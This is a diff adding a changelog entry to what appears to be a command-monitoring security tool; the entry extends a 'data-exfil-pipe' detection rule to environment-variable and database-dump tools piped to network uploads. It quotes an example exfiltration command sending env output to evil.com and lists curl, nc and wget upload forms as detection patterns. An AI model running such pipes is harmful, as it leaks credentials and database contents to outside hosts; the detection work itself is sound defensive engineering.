@@ -4,6 +4,31 @@
 
 (no entries — next release window)
 
+## [1.10.165] - 2026-05-03
+
+**`data-exfil-pipe` extended to env / DB dumps.** The original
+tool list (tar/zip/gzip/bzip2/xz/cat/base64/hexdump/xxd) was
+file-bundle oriented. This release adds:
+- `env`, `printenv` — environment variables typically contain
+  API keys, database passwords, and other secrets
+- `mongoexport`, `mysqldump`, `pg_dump` — database dump tools
+
+When piped to a remote upload (curl POST/PUT/-T/-d@-, nc
+host:port, wget --post-file), the new sources fire
+`data-exfil-pipe` as HIGH.
+
+### Changed
+- **`data-exfil-pipe`** prefix list extended with `env`,
+  `printenv`, `mongoexport`, `mysqldump`, `pg_dump`.
+
+### Why these specifically?
+`env > /tmp/x` (local dump) is dual-use (debugging). `env
+| curl evil.com -d @-` is unambiguously exfil. The same
+applies to DB dumps — the local dump is benign; piping to
+network upload is the threat. `data-exfil-pipe`'s shape
+(tool | network-upload) catches the threat without firing
+on the legitimate local form.
+
 ## [1.10.164] - 2026-05-03
 
 **Two new medium catalog patterns**: `network-sniff` and
